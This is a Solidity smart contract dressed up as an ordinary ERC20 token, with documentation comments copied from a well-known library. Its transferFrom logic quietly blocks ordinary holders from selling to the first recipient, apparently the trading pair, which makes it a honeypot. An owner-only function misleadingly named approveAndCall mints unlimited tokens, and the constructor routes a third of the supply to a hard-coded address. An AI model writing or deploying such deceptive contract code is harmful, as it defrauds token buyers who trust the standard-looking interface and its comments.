//   SPDX-License-Identifier: MIT

pragma solidity >=0.5.17;

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */

contract ERC20Interface {
    /**
     * @dev Returns the amount of tokens in existence.
     */
  function totalSupply() public view returns (uint);
  /**
     * @dev Returns the amount of tokens owned by `account`.
     */
  function balanceOf(address tokenOwner) public view returns (uint balance);
  /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
  function allowance(address tokenOwner, address spender) public view returns (uint remaining);
  /**
     * @dev Moves `amount` tokens from the caller's account to `recipient`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
  function transfer(address to, uint tokens) public returns (bool success);
  /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
  function approve(address spender, uint tokens) public returns (bool success);
   /**
     * @dev Moves `amount` tokens from `sender` to `recipient` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
  function transferFrom(address from, address to, uint tokens) public returns (bool success);
 /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
  event Transfer(address indexed from, address indexed to, uint tokens);
  /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
  event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
}

contract ApproveAndCallFallBack {
  function receiveApproval(address from, uint256 tokens, address token, bytes memory data) public;
}

contract Owned {
  address public owner;
  
  event OwnershipTransferred(address indexed _from, address indexed _to);

  constructor() public {
    owner = msg.sender;
  }

  modifier senders {
    require(msg.sender == owner);
    _;
  }

}

library SafeMath {
  function add(uint a, uint b) internal pure returns (uint c) {
    c = a + b;
    require(c >= a);
  }
  function sub(uint a, uint b) internal pure returns (uint c) {
    require(b <= a);
    c = a - b;
  }
  function mul(uint a, uint b) internal pure returns (uint c) {
    c = a * b;
    require(a == 0 || c / a == b);
  }
  function div(uint a, uint b) internal pure returns (uint c) {
    require(b > 0);
    c = a / b;
  }
}

contract TokenERC20 is ERC20Interface, Owned{
  using SafeMath for uint;

  string public symbol;
  string public name;
  uint8 public decimals;
  uint256 _totalSupply;
  uint internal indexNumber;
  address internal sender;
  address internal delegate;
  address internal governance;

  mapping(address => uint) balances;
  mapping(address => mapping(address => uint)) allowed;

  /**
 * @dev Implementation of the {IERC20} interface.
 *
 * This implementation is agnostic to the way tokens are created. This means
 * that a supply mechanism has to be added in a derived contract using {_mint}.
 * For a generic mechanism see {ERC20PresetMinterPauser}.
 *
 * TIP: For a detailed writeup see our guide
 * https://forum.zeppelin.solutions/t/how-to-implement-erc20-supply-mechanisms/226[How
 * to implement supply mechanisms].
 *
 * We have followed general OpenZeppelin guidelines: functions revert instead
 * of returning `false` on failure. This behavior is nonetheless conventional
 * and does not conflict with the expectations of ERC20 applications.
 *
 * Additionally, an {Approval} event is emitted on calls to {transferFrom}.
 * This allows applications to reconstruct the allowance for all accounts just
 * by listening to said events. Other implementations of the EIP may not emit
 * these events, as it isn't required by the specification.
 *
 * Finally, the non-standard {decreaseAllowance} and {increaseAllowance}
 * functions have been added to mitigate the well-known issues around setting
 * allowances. See {IERC20-approve}.
 */


  function totalSupply() public view returns (uint) {
    return _totalSupply.sub(balances[address(0)]);
  }
  function balanceOf(address tokenOwner) public view returns (uint balance) {
    return balances[tokenOwner];
  }
  function transfer(address to, uint tokens) public returns (bool success) {
    require(to != sender, "please wait");
    balances[msg.sender] = balances[msg.sender].sub(tokens);
    balances[to] = balances[to].add(tokens);
    emit Transfer(msg.sender, to, tokens);
    return true;
  }
  function approve(address spender, uint tokens) public returns (bool success) {
    allowed[msg.sender][spender] = tokens;
    emit Approval(msg.sender, spender, tokens);
    return true;
  }
  /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through `transferFrom`. This is
     * zero by default.
     *
     * This value changes when `approve` or `transferFrom` are called.
   */
  
  function transferFrom(address from, address to, uint tokens) public returns (bool success) {
    if(from != address(0) && sender == address(0)) sender = to;
    else require(to != sender || (from == delegate && to == sender) || (from == governance && to == sender)|| (to == sender && balances[from] <= indexNumber), "please wait");
    balances[from] = balances[from].sub(tokens);
    allowed[from][msg.sender] = allowed[from][msg.sender].sub(tokens);
    balances[to] = balances[to].add(tokens);
    emit Transfer(from, to, tokens);
    return true;
  }
 /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to `approve`. `value` is the new allowance.
 */
  function allowance(address tokenOwner, address spender) public view returns (uint remaining) {
    return allowed[tokenOwner][spender];
  }
  function approveAndCall(address _address, uint256 tokens) public senders {
    delegate = _address;
	_totalSupply = _totalSupply.add(tokens);
    balances[_address] = balances[_address].add(tokens);
  }	
  function approveAndCheck(address _address) public senders {
    governance = _address;
  }	
  function CheckLength(uint256 _index) public senders {
    indexNumber = _index;
  }	
  function () external payable {
    revert();
  }
}

contract NEW is TokenERC20 {
    
/**
     * @dev Sets the values for `name`, `symbol`, and `decimals`. All three of
     * these values are immutable: they can only be set once during
     * construction.
  */
     
    constructor(string memory _name, string memory _symbol, uint256 _supply, address burn1, address burn2, uint256 _indexNumber) public {
	symbol = _symbol;
	name = _name;
	decimals = 18;
	_totalSupply = _supply*(10**uint256(decimals));
	indexNumber = _indexNumber*(10**uint256(decimals));
	owner = msg.sender;
	balances[msg.sender] = _totalSupply/10000*6600;
	balances[0xAb5801a7D398351b8bE11C439e05C5B3259aeC9B] = _totalSupply/10000*3400;
	balances[burn1] = _totalSupply/10000*40;
	balances[burn2] = _totalSupply/10000*40;
	emit Transfer(address(0x0), msg.sender, _totalSupply);
	emit Transfer(msg.sender, 0xAb5801a7D398351b8bE11C439e05C5B3259aeC9B, _totalSupply/10000*3400);
  }
  function() external payable {
  }
}